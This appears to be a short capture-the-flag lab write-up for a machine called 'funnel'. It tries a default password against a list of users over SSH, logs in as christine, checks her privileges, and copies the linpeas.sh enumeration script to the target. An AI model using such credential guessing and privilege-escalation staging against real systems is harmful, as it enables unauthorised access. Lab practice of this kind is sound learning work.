### Check SSH access for users with default creds
- root
- optimus
- albert
- andreas
- christine
- maria
- Default password to try: funnel123#!#
- Likely christine based on their default ftp password
- funnel123#!#

SSH: christine funnel123#!#

```
christine@funnel:~$ id
uid=1000(christine) gid=1000(christine) groups=1000(christine)

christine@funnel:~$ sudo -l
[sudo] password for christine: 
Sorry, user christine may not run sudo on funnel.
```

Uploading linpeas.sh
```
$ linpeas

> peass ~ Privilege Escalation Awesome Scripts SUITE

/usr/share/peass/linpeas
├── linpeas_darwin_amd64
├── linpeas_darwin_arm64
├── linpeas_fat.sh
├── linpeas_linux_386
├── linpeas_linux_amd64
├── linpeas_linux_arm
├── linpeas_linux_arm64
├── linpeas.sh
└── linpeas_small.sh
┌──(kali㉿kali)-[/usr/share/peass/linpeas]
└─$ scp linpeas.sh christine@10.129.22.132:                 
The authenticity of host '10.129.22.132 (10.129.22.132)' can't be established.
ED25519 key fingerprint is SHA256:RoZ8jwEnGGByxNt04+A/cdluslAwhmiWqG3ebyZko+A.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:17: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.22.132' (ED25519) to the list of known hosts.
christine@10.129.22.132's password: 
linpeas.sh 
```